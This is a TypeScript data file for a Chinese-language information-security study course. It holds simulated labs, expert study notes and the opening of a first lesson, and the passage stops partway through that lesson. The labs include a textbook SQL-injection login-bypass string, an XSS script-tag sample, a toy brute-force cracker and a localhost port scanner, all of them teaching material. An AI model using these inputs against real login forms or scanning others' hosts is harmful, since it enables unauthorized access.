export interface CodeExample {
  language: string;
  code: string;
  description: string;
}

// 与 hooks/useQuiz.ts 保持同步
export interface QuizQuestion {
  id?: string;
  question: string;
  options?: string[];
  correctIndex?: number;
  correctAnswer?: string;
  type?: 'single' | 'multiple' | 'boolean' | 'fill';
  correctIndices?: number[];
  explanation: string;
}

export interface LabTool {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface LabEnvironment {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface ExpertNote {
  author: string;
  title: string;
  content: string;
  url: string;
}

export interface LearningDay {
  id: string;
  day: number;
  week: number;
  title: string;
  objectives: string[];
  content: string;
  codeExample?: CodeExample;
  quiz: QuizQuestion[];
  resources?: string[];
  recommendedTools?: LabTool[];
  labEnvironments?: LabEnvironment[];
  expertNotes?: ExpertNote[];
}

export interface Experiment {
  id: string;
  title: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  instructions: string[];
  initialCode: string;
  expectedOutput: string;
  hints: string[];
}

export const weekThemes = [
  { week: 1, theme: '信息安全基础', color: '#00ff88' },
  { week: 2, theme: '信息安全法规', color: '#00d4ff' },
  { week: 3, theme: '访问控制', color: '#ffd700' },
  { week: 4, theme: '安全运营', color: '#ff3366' },
  { week: 5, theme: '漏洞与攻击', color: '#00ff88' },
  { week: 6, theme: '加密技术', color: '#00d4ff' },
  { week: 7, theme: '网络安全', color: '#ffd700' },
  { week: 8, theme: '应用安全', color: '#ff3366' },
  { week: 9, theme: '物理安全', color: '#00ff88' },
  { week: 10, theme: '安全工程', color: '#00d4ff' },
  { week: 11, theme: '业务安全', color: '#ffd700' },
  { week: 12, theme: '模拟考试', color: '#ff3366' },
];

export const experiments: Experiment[] = [
  {
    id: 'sql-injection',
    title: 'SQL注入攻击模拟',
    description: '学习如何发现和防止SQL注入漏洞',
    difficulty: 'medium',
    instructions: [
      '这是一个模拟的登录系统',
      '尝试使用SQL注入绕过身份验证',
      '输入: admin\' OR \'1\'=\'1',
      '观察查询结果的变化',
    ],
    initialCode: `# 模拟SQL查询
username = input("用户名: ")
password = input("密码: ")

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

print(f"执行的SQL: {query}")
print("-" * 50)

if "OR" in username or "'" in username:
    print("警告: 检测到可疑输入!")
    print("实际应该使用参数化查询")
else:
    print("查询执行中...")`,
    expectedOutput: '检测到SQL注入攻击',
    hints: ['使用单引号破坏SQL语法', 'OR条件永真'],
  },
  {
    id: 'xss-demo',
    title: 'XSS跨站脚本攻击',
    description: '了解XSS攻击的原理和防护措施',
    difficulty: 'easy',
    instructions: [
      '这是一个评论系统',
      '尝试输入HTML或JavaScript代码',
      '观察输入是如何被处理的',
      '学习如何正确转义用户输入',
    ],
    initialCode: `# 模拟评论系统
comment = input("输入评论: ")

print("=" * 50)
print("未处理的输出:")
print(comment)
print("=" * 50)

if "<script>" in comment.lower():
    print("警告: 检测到脚本标签!")
    print("这是XSS攻击!")
else:
    print("评论已提交")`,
    expectedOutput: '检测到XSS攻击',
    hints: ['使用script标签', '尝试事件处理器'],
  },
  {
    id: 'password-crack',
    title: '密码暴力破解模拟',
    description: '理解弱密码的危险性',
    difficulty: 'easy',
    instructions: [
      '模拟暴力破解弱密码',
      '观察不同密码长度对安全性的影响',
      '了解密码强度的重要性',
    ],
    initialCode: `import itertools
import string

def try_password(target, charset, max_len):
    attempts = 0
    for length in range(1, max_len + 1):
        for guess in itertools.product(charset, repeat=length):
            attempts += 1
            password = ''.join(guess)
            if password == target:
                return attempts
    return None

target_password = "abc"

print("密码破解模拟器")
print("=" * 50)
print(f"目标密码: {target_password}")

result = try_password(target_password, string.ascii_lowercase, 4)

if result:
    print(f"密码被破解! 共尝试 {result:,} 次")`,
    expectedOutput: '密码被破解',
    hints: ['弱密码容易被快速破解', '增加密码长度和复杂度'],
  },
  {
    id: 'log-analysis',
    title: '日志分析练习',
    description: '学习从日志中发现安全威胁',
    difficulty: 'medium',
    instructions: [
      '分析提供的日志条目',
      '识别潜在的安全威胁',
      '标记可疑的活动模式',
    ],
    initialCode: `# 模拟日志分析
logs = [
    "2024-01-15 08:00:01 GET /index.html 200",
    "2024-01-15 08:00:02 POST /login 200",
    "2024-01-15 08:00:03 POST /login 401",
    "2024-01-15 08:00:04 POST /login 401",
    "2024-01-15 08:00:05 POST /login 401",
]

print("安全日志分析器")
print("=" * 60)

failed_logins = sum(1 for log in logs if "401" in log)
print(f"失败登录次数: {failed_logins}")

if failed_logins >= 3:
    print("警告: 检测到可能的暴力破解攻击!")`,
    expectedOutput: '警告: 检测到暴力破解攻击',
    hints: ['关注401状态码', '注意/admin路径的访问'],
  },
  {
    id: 'hash-demo',
    title: '哈希函数实践',
    description: '理解哈希在数据完整性中的应用',
    difficulty: 'easy',
    instructions: [
      '计算文件的哈希值',
      '验证数据完整性',
      '了解哈希碰撞',
    ],
    initialCode: `import hashlib

def calculate_hash(data, algorithm='sha256'):
    hash_obj = hashlib.new(algorithm)
    hash_obj.update(data.encode('utf-8'))
    return hash_obj.hexdigest()

test_data = "这是重要的配置文件内容"

print("哈希计算器")
print("=" * 50)
print(f"原始数据: {test_data}")

for algo in ['md5', 'sha1', 'sha256']:
    hash_value = calculate_hash(test_data, algo)
    print(f"{algo.upper()}: {hash_value}")`,
    expectedOutput: '哈希值计算完成',
    hints: ['哈希是单向函数', '无法从哈希反推原始数据'],
  },
  {
    id: 'encrypt-decrypt',
    title: '对称加密演示',
    description: '学习对称加密的原理',
    difficulty: 'medium',
    instructions: [
      '使用简单加密算法加密数据',
      '理解密钥的重要性',
      '了解加密和解密过程',
    ],
    initialCode: `# 简单的XOR加密演示
def xor_encrypt(text, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))

message = "密码是Secret123"
key = "KEY"

print("XOR加密演示")
print("=" * 50)
print(f"原始消息: {message}")

encrypted = xor_encrypt(message, key)
print(f"加密后: {repr(encrypted)}")

decrypted = xor_encrypt(encrypted, key)
print(f"解密后: {decrypted}")`,
    expectedOutput: '加密解密完成',
    hints: ['XOR是简单的加密方法', '密钥长度很重要'],
  },
  {
    id: 'firewall-rules',
    title: '防火墙规则配置',
    description: '学习基本的防火墙规则',
    difficulty: 'hard',
    instructions: [
      '根据需求配置防火墙规则',
      '理解规则优先级',
      '测试规则的有效性',
    ],
    initialCode: `# 模拟防火墙规则配置
rules = [
    {"action": "ALLOW", "port": 80, "desc": "HTTP"},
    {"action": "ALLOW", "port": 443, "desc": "HTTPS"},
    {"action": "DENY", "port": 22, "desc": "SSH"},
]

packets = [
    {"port": 80, "ip": "203.0.113.50"},
    {"port": 22, "ip": "198.51.100.25"},
]

print("防火墙规则模拟器")
print("=" * 60)

for packet in packets:
    print(f"数据包: port {packet['port']} from {packet['ip']}")
    for rule in rules:
        if rule['port'] == packet['port']:
            print(f"  -> {rule['action']} ({rule['desc']})")
            break`,
    expectedOutput: '防火墙过滤完成',
    hints: ['规则按顺序匹配', '考虑源IP地址限制'],
  },
  {
    id: 'port-scan',
    title: '端口扫描模拟',
    description: '学习Nmap端口扫描原理',
    difficulty: 'medium',
    instructions: [
      '了解端口扫描的基本原理',
      '学习TCP全连接扫描和SYN半开扫描',
      '识别常见端口对应的服务',
      '观察扫描结果并分析',
    ],
    initialCode: `# 模拟端口扫描
import socket

target = "127.0.0.1"
common_ports = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    3306: "MySQL",
    3389: "RDP",
}

print(f"端口扫描目标: {target}")
print("=" * 60)

open_ports = []
for port in common_ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((target, port))
    if result == 0:
        open_ports.append(port)
        print(f"[+] 端口 {port} ({common_ports[port]}) - 开放")
    sock.close()

print("=" * 60)
print(f"扫描完成，发现 {len(open_ports)} 个开放端口")`,
    expectedOutput: '端口扫描完成',
    hints: ['端口对应应用层服务', '扫描应获得授权进行'],
  },
  {
    id: 'vuln-scan',
    title: '漏洞扫描练习',
    description: '学习漏洞扫描工具使用',
    difficulty: 'hard',
    instructions: [
      '理解漏洞编号（CVE）和评分（CVSS）',
      '学习漏洞扫描报告的解读',
      '根据风险等级制定处置方案',
      '了解漏洞修复优先级',
    ],
    initialCode: `# 漏洞扫描结果分析示例
vulnerabilities = [
    {"cve": "CVE-2023-0001", "cvss": 9.8, "severity": "严重", "description": "远程代码执行漏洞"},
    {"cve": "CVE-2023-0002", "cvss": 7.5, "severity": "高危", "description": "SQL注入漏洞"},
    {"cve": "CVE-2023-0003", "cvss": 5.3, "severity": "中危", "description": "信息泄露漏洞"},
    {"cve": "CVE-2023-0004", "cvss": 3.7, "severity": "低危", "description": "配置信息泄露"},
]

print("漏洞扫描报告")
print("=" * 70)
print(f"{'CVE编号':<20} {'CVSS评分':<12} {'严重级别':<10} {'描述'}")
print("-" * 70)

total_score = 0
severity_count = {"严重": 0, "高危": 0, "中危": 0, "低危": 0}

for vuln in vulnerabilities:
    print(f"{vuln['cve']:<20} {vuln['cvss']:<12} {vuln['severity']:<10} {vuln['description']}")
    total_score += vuln['cvss']
    severity_count[vuln['severity']] += 1

print("=" * 70)
print(f"漏洞总数: {len(vulnerabilities)} | 平均CVSS: {total_score/len(vulnerabilities):.1f}")
print(f"严重:{severity_count['严重']} 高危:{severity_count['高危']} 中危:{severity_count['中危']} 低危:{severity_count['低危']}")`,
    expectedOutput: '漏洞扫描分析完成',
    hints: ['CVSS分数越高风险越大', '严重漏洞需优先修复'],
  },
  {
    id: 'access-control',
    title: '访问控制模型',
    description: '理解DAC/MAC/RBAC模型',
    difficulty: 'medium',
    instructions: [
      '理解自主访问控制（DAC）',
      '理解强制访问控制（MAC）',
      '理解基于角色的访问控制（RBAC）',
      '比较三种模型的适用场景',
    ],
    initialCode: `# 三种访问控制模型演示

# 1. DAC (自主访问控制): 资源所有者决定权限
print("=" * 60)
print("DAC - 自主访问控制")
print("=" * 60)
files_dac = {
    "report.txt": {"owner": "Alice", "permissions": {"Alice": "rw", "Bob": "r"}},
}
for fname, finfo in files_dac.items():
    print(f"文件: {fname}, 所有者: {finfo['owner']}")
    for user, perm in finfo['permissions'].items():
        print(f"  {user}: {perm}")

# 2. MAC (强制访问控制): 系统根据安全标签决定
print()
print("=" * 60)
print("MAC - 强制访问控制")
print("=" * 60)
users_mac = {"Alice": "秘密", "Bob": "公开"}
data_mac = {"doc1": "秘密", "doc2": "公开"}
for user, level in users_mac.items():
    for doc, dlevel in data_mac.items():
        access = "允许" if (level == dlevel or (level == "秘密" and dlevel == "公开")) else "拒绝"
        print(f"{user}({level}) 访问 {doc}({dlevel}): {access}")

# 3. RBAC (基于角色的访问控制): 根据角色分配权限
print()
print("=" * 60)
print("RBAC - 基于角色的访问控制")
print("=" * 60)
roles = {"管理员": ["查看", "修改", "删除"], "普通用户": ["查看"]}
user_roles = {"Alice": "管理员", "Bob": "普通用户"}
for user, role in user_roles.items():
    print(f"{user} ({role}): {', '.join(roles[role])}")`,
    expectedOutput: '三种访问控制模型演示完成',
    hints: ['RBAC最常用，MAC最严格', '适合的场景选择合适的模型'],
  },
  {
    id: 'incident-response',
    title: '安全事件响应',
    description: '学习应急响应流程',
    difficulty: 'medium',
    instructions: [
      '理解安全事件响应六阶段',
      '学习各阶段的核心任务',
      '了解事件响应团队组成',
      '掌握事件报告的基本要素',
    ],
    initialCode: `# 安全事件响应流程
incident_stages = [
    ("1. 准备阶段", "建立响应团队、应急预案、工具准备、培训演练"),
    ("2. 检测阶段", "监控告警、日志分析、异常识别、事件确认"),
    ("3. 遏制阶段", "隔离受影响系统、阻断攻击、防止扩散"),
    ("4. 根除阶段", "清除恶意软件、修补漏洞、移除后门"),
    ("5. 恢复阶段", "验证系统完整性、恢复服务、监控运行"),
    ("6. 总结阶段", "事件复盘、流程改进、经验归档、报告撰写"),
]

print("安全事件响应六阶段")
print("=" * 70)

for stage_name, stage_desc in incident_stages:
    print(f"{stage_name}")
    print(f"  {stage_desc}")
    print()

# 模拟事件响应评估
print("=" * 70)
print("事件响应能力评估")
print("=" * 70)

preparedness = {
    "应急预案": True,
    "响应团队": True,
    "监控工具": False,
    "定期演练": False,
}

score = sum(1 for v in preparedness.values() if v)
total = len(preparedness)
for item, status in preparedness.items():
    symbol = "[OK]" if status else "[待改进]"
    print(f"  {symbol} {item}")
print(f"  准备程度: {score}/{total} ({score/total*100:.0f}%)")`,
    expectedOutput: '事件响应流程演示完成',
    hints: ['准备阶段最重要', '遏制要快，根除要彻底'],
  },
  {
    id: 'risk-assessment',
    title: '风险评估计算',
    description: '学习信息安全风险评估方法',
    difficulty: 'easy',
    instructions: [
      '理解风险公式: 风险 = 威胁 × 脆弱性 × 影响',
      '学习风险矩阵的使用',
      '掌握风险处置策略',
      '练习风险等级判定',
    ],
    initialCode: `# 信息安全风险评估
def calculate_risk(threat, vulnerability, impact):
    """
    风险值 = 威胁 × 脆弱性 × 影响
    每项分值 1-5, 最高风险值 125
    """
    risk_value = threat * vulnerability * impact
    if risk_value >= 100:
        level = "极高风险"
        action = "立即处置"
    elif risk_value >= 50:
        level = "高风险"
        action = "优先处置"
    elif risk_value >= 20:
        level = "中风险"
        action = "计划处置"
    else:
        level = "低风险"
        action = "接受或监控"
    return risk_value, level, action

# 风险场景评估
scenarios = [
    ("Web应用SQL注入", 4, 5, 4),
    ("机房物理访问", 2, 3, 5),
    ("密码被暴力破解", 3, 4, 3),
    ("员工丢失U盘", 3, 2, 2),
]

print("信息安全风险评估表")
print("=" * 80)
print(f"{'风险场景':<20} {'威胁':<6} {'脆弱性':<6} {'影响':<6} {'风险值':<8} {'等级':<12} {'处置策略'}")
print("-" * 80)

for name, t, v, i in scenarios:
    rv, level, action = calculate_risk(t, v, i)
    print(f"{name:<20} {t:<8} {v:<8} {i:<6} {rv:<10} {level:<14} {action}")

print("=" * 80)
print()
print("风险处置策略:")
print("  避免: 消除风险源 / 降低: 减小风险 / 转移: 保险外包 / 接受: 承担风险")`,
    expectedOutput: '风险评估计算完成',
    hints: ['风险值越高越紧急', '处置策略需平衡成本和收益'],
  },
  {
    id: 'web-vuln',
    title: 'OWASP Top 10漏洞识别',
    description: '识别常见Web安全漏洞',
    difficulty: 'medium',
    instructions: [
      '了解OWASP Top 10十大Web漏洞',
      '学习各漏洞的原理和危害',
      '掌握漏洞识别方法',
      '理解基本防护措施',
    ],
    initialCode: `# OWASP Top 10 常见Web漏洞识别
vulnerabilities = [
    ("A01: 访问控制失效", "未受保护的管理后台 /admin", "后台应仅允许特定IP"),
    ("A02: 认证失败", "弱密码 admin/admin123", "强制强密码+多因素认证"),
    ("A03: 注入漏洞", "SQL注入: ' OR '1'='1", "参数化查询+输入验证"),
    ("A04: 不安全设计", "缺乏风控的大额转账", "业务逻辑安全设计"),
    ("A05: 安全配置错误", "默认密码未修改 / 调试模式开启", "加固配置+定期审计"),
    ("A06: 易受攻击和过时组件", "使用含漏洞的第三方库", "依赖扫描+及时更新"),
    ("A07: 识别和认证失败", "会话固定攻击", "登录后重新生成会话ID"),
    ("A08: 软件和数据完整性失败", "下载文件被篡改", "数字签名+哈希校验"),
    ("A09: 安全日志和监控不足", "不记录登录失败日志", "完善日志+实时告警"),
    ("A10: SSRF 服务端请求伪造", "服务器访问内部资源 http://localhost", "限制出站请求"),
]

print("OWASP Top 10 Web安全漏洞")
print("=" * 80)

for code, name in enumerate(vulnerabilities, 1):
    cat, example, fix = name
    print(f"{cat}")
    print(f"  示例: {example}")
    print(f"  防护: {fix}")
    print()

print("=" * 80)
print("测试: 判断以下场景属于哪类漏洞?")
print("场景1: 用户输入 <script>alert(1)</script> 在评论中执行")
print("场景2: 用户修改 URL ?user_id=123 可以查看他人数据")
print("场景3: 使用已知有漏洞的 Log4j 版本")`,
    expectedOutput: 'Web漏洞识别演示完成',
    hints: ['XSS属于注入类', '越权属于访问控制类'],
  },
];

const dayExpertNotes: { [key: number]: ExpertNote[] } = {
  1: [
    { author: '张伟', title: 'CIA三要素深度解析', content: 'CIA三要素是信息安全的基石。机密性确保数据不被未授权访问，完整性保证数据不被篡改，可用性确保系统随时可用。实践中要注意：加密是机密性的基础，哈希校验是完整性的保障，冗余备份是可用性的关键。', url: '' },
    { author: '李明', title: '安全威胁识别方法', content: '识别威胁要从多个维度入手：外部威胁（黑客、APT组织）、内部威胁（员工误操作、恶意行为）、环境威胁（自然灾害、设备故障）。建议建立威胁情报订阅机制，及时了解最新威胁动态。', url: '' },
  ],
  2: [
    { author: '王芳', title: '信息安全发展趋势', content: '从通信安全到信息化安全，安全的范畴在不断扩大。当前的趋势是零信任架构、AI安全、云安全和数据安全。建议关注NIST、ISO等标准组织的最新发布，保持知识更新。', url: '' },
    { author: '赵强', title: '安全标准演进历程', content: '从TCSEC到ISO 27001，安全标准越来越注重风险管理和持续改进。等保2.0强调"一个中心、三重防护"，建议深入理解其核心思想。', url: '' },
  ],
  3: [
    { author: '孙丽', title: '网络安全分层防御', content: '网络安全需要多层防护：边界防护（防火墙）、网络层（入侵检测）、应用层（WAF）、终端层（EDR）。没有银弹，需要纵深防御策略。', url: '' },
    { author: '周伟', title: 'TCP/IP协议安全', content: '理解TCP/IP协议是网络安全的基础。三次握手、端口扫描、DNS解析等都可能成为攻击入口。建议用Wireshark抓包分析真实流量，加深理解。', url: '' },
  ],
  4: [
    { author: '吴刚', title: '恶意软件分析入门', content: '分析恶意软件需要掌握基本工具：静态分析（IDA Pro、Ghidra）、动态分析（Cuckoo Sandbox）、行为分析（Process Monitor）。建议从简单的恶意软件样本开始练习。', url: '' },
    { author: '郑敏', title: '防病毒策略优化', content: '传统签名检测已经不够，需要结合行为检测和机器学习。建议部署EDR解决方案，建立威胁狩猎能力。定期更新病毒库，保持系统补丁最新。', url: '' },
  ],
  5: [
    { author: '黄磊', title: '社会工程学防范', content: '社会工程攻击成功率极高，因为它针对人性弱点。防范措施包括：安全意识培训、多因素认证、可疑邮件报告机制。记住：官方机构不会通过电话索要密码。', url: '' },
    { author: '陈明', title: '钓鱼邮件识别技巧', content: '识别钓鱼邮件要注意：发件人地址、邮件内容语法、附件类型、紧急语气。建议部署邮件安全网关，对可疑邮件进行沙箱检测。', url: '' },
  ],
  6: [
    { author: '林静', title: '密码学入门指南', content: '学习密码学从基础开始：对称加密、非对称加密、哈希函数。推荐用OpenSSL做实践练习，理解AES、RSA、SHA等算法的使用场景。不要自己实现加密算法！', url: '' },
    { author: '刘洋', title: '密钥管理最佳实践', content: '密钥是加密的核心。建议使用硬件安全模块（HSM）存储密钥，实施密钥轮换策略，定期审计密钥使用情况。避免硬编码密钥！', url: '' },
  ],
  7: [
    { author: '陈婷', title: '第一周学习总结', content: '第一周是基础中的基础，重点掌握CIA三要素和安全威胁分类。建议回顾本周内容，完成练习题检验学习效果。下周将学习法律法规知识，提前做好准备。', url: '' },
    { author: '张明', title: '学习方法建议', content: '信息安全学习需要理论与实践结合。每天保持2小时学习时间，多动手操作。建立知识体系思维导图，定期复习巩固。', url: '' },
  ],
  8: [
    { author: '赵强', title: '网络安全法解读', content: '《网络安全法》是我国网络安全领域的基本法，规定了网络运营者的安全义务、数据保护要求和法律责任。建议逐条研读，理解合规要点。', url: '' },
    { author: '孙丽', title: '数据安全法要点', content: '《数据安全法》强调数据分类分级保护，建立数据安全审查制度。企业需要制定数据安全管理制度，明确数据负责人职责。', url: '' },
  ],
  9: [
    { author: '周伟', title: '等保2.0实施指南', content: '等保2.0核心是"一个中心、三重防护"。实施步骤：定级备案→差距分析→安全建设→测评整改→持续监控。建议聘请专业机构进行合规咨询。', url: '' },
    { author: '吴刚', title: '等保测评准备', content: '测评前准备：整理制度文档、安全策略、运维记录、应急预案。重点关注技术层面：网络架构、访问控制、日志审计、数据保护。', url: '' },
  ],
  10: [
    { author: '郑敏', title: '个人信息保护法解读', content: '《个人信息保护法》赋予个人多项权利：知情权、决定权、删除权、可携带权。企业需要建立个人信息处理合规体系，开展隐私影响评估。', url: '' },
    { author: '黄磊', title: '数据脱敏实践', content: '数据脱敏是保护个人信息的重要手段。常用方法：加密、掩码、替换、删除。根据业务场景选择合适的脱敏方式，确保数据可用性和安全性平衡。', url: '' },
  ],
  11: [
    { author: '陈明', title: '关键信息基础设施保护', content: 'CII是国家安全的关键。运营者需要履行安全保护义务：制定专项保护计划、开展安全评估、建立监测预警体系。建议建立CII资产清单，实施重点保护。', url: '' },
    { author: '林静', title: '供应链安全', content: '供应链攻击日益增多，需要关注第三方组件安全。建议实施软件物料清单（SBOM）管理，定期对供应商进行安全评估。', url: '' },
  ],
  12: [
    { author: '刘洋', title: '网络安全审查要点', content: '网络安全审查关注影响国家安全的网络产品和服务。企业在采购关键设备时需要提前评估，必要时申报审查。建议建立供应商安全评估机制。', url: '' },
    { author: '陈婷', title: '数据出境合规', content: '数据出境需要满足法定条件：安全评估、标准合同、认证等。建议梳理数据流向，识别出境数据，制定合规方案。', url: '' },
  ],
  13: [
    { author: '张明', title: '合规管理体系建设', content: '合规管理需要建立完整体系：政策制度、组织架构、流程管控、技术保障、培训宣贯。建议参考ISO 27001建立信息安全管理体系。', url: '' },
    { author: '李华', title: '安全策略制定', content: '安全策略是安全管理的基石。策略应涵盖：访问控制、密码管理、数据分类、事件响应、应急预案。策略需要定期评审更新。', url: '' },
  ],
  14: [
    { author: '王静', title: '第二周学习总结', content: '法律法规是安全工作的底线。重点掌握等保2.0和数据合规要求。建议建立合规清单，对照检查自身差距。下周将学习访问控制技术。', url: '' },
    { author: '陈刚', title: '合规工具推荐', content: '推荐工具：等保合规检查工具、数据分类分级系统、隐私影响评估模板。利用自动化工具提高合规效率。', url: '' },
  ],
  15: [
    { author: '赵丽', title: '身份认证技术选型', content: '认证方式选择依据安全等级：普通系统用密码+MFA，高安全系统用硬件令牌或生物识别。建议实施密码策略，定期强制修改密码。', url: '' },
    { author: '孙强', title: '多因素认证部署', content: 'MFA是抵御密码泄露的有效手段。推荐使用TOTP（如Google Authenticator）或硬件密钥（如YubiKey）。注意备份恢复机制。', url: '' },
  ],
  16: [
    { author: '周芳', title: '密码安全最佳实践', content: '密码策略：长度至少12位、复杂度要求、定期更换、禁止重复使用。建议使用密码管理器，每个网站使用唯一密码。禁止使用生日、姓名等易猜测信息。', url: '' },
    { author: '吴涛', title: '密码破解防御', content: '防御密码破解：实施账户锁定策略、使用加盐哈希、限制登录尝试次数。建议使用bcrypt或Argon2等高成本哈希算法。', url: '' },
  ],
  17: [
    { author: '郑欣', title: '生物识别技术应用', content: '生物识别方便但有风险：指纹可被复制、面部识别可被欺骗。建议作为多因素认证的第二因素使用，不要单独作为唯一认证方式。', url: '' },
    { author: '黄磊', title: '行为生物识别', content: '行为生物识别是新兴技术：击键节奏、鼠标移动、步态等。可用于连续认证，提高安全性。注意隐私保护问题。', url: '' },
  ],
  18: [
    { author: '林静', title: '多因素认证设计', content: 'MFA组合策略：知识因素（密码）+持有因素（手机）+生物因素（指纹）。至少使用两种不同类型的因素。备份方案要安全可靠。', url: '' },
    { author: '徐鹏', title: '无密码认证趋势', content: '无密码认证是未来方向：FIDO2/WebAuthn协议支持硬件密钥认证。建议关注Passkey技术，逐步减少密码依赖。', url: '' },
  ],
  19: [
    { author: '马丽', title: 'SSO实施策略', content: 'SSO提升用户体验和安全性。选择方案：SAML 2.0适用于企业场景，OAuth 2.0适用于API场景，OpenID Connect适用于身份认证。注意安全配置，避免配置错误导致漏洞。', url: '' },
    { author: '刘伟', title: '身份提供商选择', content: '自建IDP适合大型企业，云IDP适合中小企业。推荐方案：Azure AD、Okta、Keycloak（开源）。关注集成能力和安全合规认证。', url: '' },
  ],
  20: [
    { author: '陈明', title: 'OAuth 2.0深度解析', content: 'OAuth 2.0不是认证协议，是授权协议。核心概念：授权码流程、令牌类型、作用域。注意授权码拦截攻击，使用PKCE增强安全性。', url: '' },
    { author: '杨雪', title: 'SAML与OAuth对比', content: 'SAML适合企业SSO，OAuth适合API授权。SAML基于XML，OAuth基于JSON。根据场景选择合适方案，不要混用。', url: '' },
  ],
  21: [
    { author: '赵云', title: '第三周学习总结', content: '访问控制是安全的核心。重点掌握认证技术和SSO实现。建议动手搭建一个简单的认证系统加深理解。下周将学习安全运营知识。', url: '' },
    { author: '孙燕', title: 'IAM体系建设', content: 'IAM涵盖身份管理、认证管理、授权管理。建议建立完整的IAM体系，实施权限生命周期管理。定期进行权限审计。', url: '' },
  ],
  22: [
    { author: '周杰', title: 'SOC建设指南', content: 'SOC建设需要技术和流程并重。建议分阶段实施：第一阶段建立监控能力，第二阶段建立检测响应能力，第三阶段实现自动化运营。', url: '' },
    { author: '吴敏', title: '安全运营成熟度', content: '从被动响应到主动防御需要时间。建议对照NIST CSF评估当前成熟度，制定改进路线图。工具不是万能的，流程更重要。', url: '' },
  ],
  23: [
    { author: '郑伟', title: '日志管理最佳实践', content: '日志是安全分析的基础。统一日志格式、确保时间同步、保留足够期限。建议使用ELK或Splunk建立集中日志平台。', url: '' },
    { author: '张伟', title: '日志分析技巧', content: '学习使用正则表达式和查询语言分析日志。建立关联分析能力，从海量日志中发现异常行为。关注失败登录、权限变更等关键事件。', url: '' },
  ],
  24: [
    { author: '李明', title: '安全监控体系', content: '监控覆盖网络、主机、应用、云环境。建立告警分级规则，避免告警疲劳。建议实施SOAR平台，实现自动化响应。', url: '' },
    { author: '王芳', title: '威胁情报整合', content: '威胁情报提高检测能力。订阅高质量情报源，整合到SIEM中。注意情报的时效性和准确性，定期评估情报质量。', url: '' },
  ],
  25: [
    { author: '赵强', title: '事件响应流程', content: '事件响应遵循PDCERF模型：准备→检测→抑制→根除→恢复→跟踪。建立清晰的角色职责，定期演练检验流程有效性。', url: '' },
    { author: '孙丽', title: 'SOC值班制度', content: '建立7x24小时值班机制，明确轮班安排和告警响应SLA。配备L1/L2/L3分析师团队，分级处理告警。', url: '' },
  ],
  26: [
    { author: '周伟', title: '应急响应预案', content: '预案需要覆盖常见场景：勒索软件、数据泄露、DDoS攻击、内部威胁。预案要可操作，定期演练更新。建立危机沟通机制。', url: '' },
    { author: '吴刚', title: '取证分析要点', content: '取证要遵循证据链原则。先收集易失性证据（内存），再收集非易失性证据（磁盘）。注意证据完整性，避免破坏原始数据。', url: '' },
  ],
  27: [
    { author: '郑敏', title: '灾难恢复规划', content: '备份策略遵循3-2-1原则：3份数据、2种介质、1份异地。定期测试恢复能力，确保RTO和RPO目标达成。建立异地灾备中心。', url: '' },
    { author: '黄磊', title: '业务连续性管理', content: 'BCM关注业务层面的连续性。识别关键业务流程，制定恢复优先级。定期进行业务影响分析（BIA）和演练。', url: '' },
  ],
  28: [
    { author: '陈明', title: '第四周学习总结', content: '安全运营是安全能力的体现。重点掌握日志管理和事件响应。建议参与一次应急演练，体验真实场景。下周将学习漏洞相关知识。', url: '' },
    { author: '林静', title: '安全运营工具链', content: '推荐工具：SIEM（Splunk/ELK）、EDR（CrowdStrike）、SOAR（Demisto）。根据预算和需求选择合适的解决方案。', url: '' },
  ],
  29: [
    { author: '刘洋', title: '漏洞管理流程', content: '漏洞管理生命周期：发现→评估→修复→验证→跟踪。建立漏洞优先级评估机制，根据CVSS评分和业务影响综合判断。', url: '' },
    { author: '陈婷', title: '漏洞数据库使用', content: '关注CVE、NVD、CNNVD等漏洞数据库。订阅漏洞告警，及时获取关键漏洞信息。建立内部漏洞知识库。', url: '' },
  ],
  30: [
    { author: '张明', title: '常见漏洞类型分析', content: 'OWASP Top 10是Web安全的重点：失效的访问控制、加密失效、注入攻击等。理解每种漏洞的原理和防护方法，结合靶场练习。', url: '' },
    { author: '李华', title: '漏洞挖掘技巧', content: '漏洞挖掘需要掌握：模糊测试、代码审计、逆向分析。从简单的靶场开始，逐步提高难度。遵守漏洞披露规范。', url: '' },
  ],
};

// Complete learning content for all 90 days
const allDays: LearningDay[] = [
  // ========== Week 1: 信息安全基础 ==========
  {
    id: 'day-1', day: 1, week: 1, title: '信息安全的定义',
    objectives: ['理解信息安全概念', '掌握CIA三要素', '了解安全威胁分类'],
    content: '# 信息安全概述\n\n> 📋 **本节大纲**　一、什么是信息安全 · 二、CIA三要素详解（机密性/完整性/可用性，含破坏案例+5项防护措施） · 三、CIA要素的制约关系 · 四、威胁分类（按来源/按行为/五大常见威胁详解） · 五、\n## 🔴 高频考点\n\n· CIA三要素是所有CISP考题的基础框架，必须能默写三个英文全称\n· 内部威胁vs外部威胁的本质区别：**前者拥有合法访问权限**，这是最高频的判断题陷阱\n· 被动攻击（窃听/不留下痕迹）vs主动攻击（篡改/会留日志）的检测难度对比，考试常考\n## 💜 记忆口诀\n\n· **CIA三要素**：C=看不到(Confidentiality)、I=改不了(Integrity)、A=用得了(Availability)\n· **内部威胁**："权限是工作需要，也是威胁来源"\n· **被动vs主动**："被动悄悄看(窃听/难检测)、主动动手改(篡改/留痕迹)"\n学习建议与考点速记\n\n## 什么是信息安全？\n\n信息安全（Information Security）是指保护信息及信息系统免受未经授权的访问、使用、披露、破坏、修改或销毁，确保信息在产生、传输、存储、处理、销毁全生命周期中的安全。\n\n信息安全的保护对象不仅仅是"数据"，还包括：\n- **硬件**：服务器、网络设备、存储设备\n- **软件**：操作系统、应用程序、数据库\n- **数据**：数据库记录、文件、通信内容\n- **人员**：员工、客户、合作伙伴的信息\n- **流程**：业务流程、操作规程\n\n信息安全的终极目标是保障组织业务在面临威胁时能够持续运行，保护组织的核心资产（数据、声誉、客户信任）不受损害。\n\n## 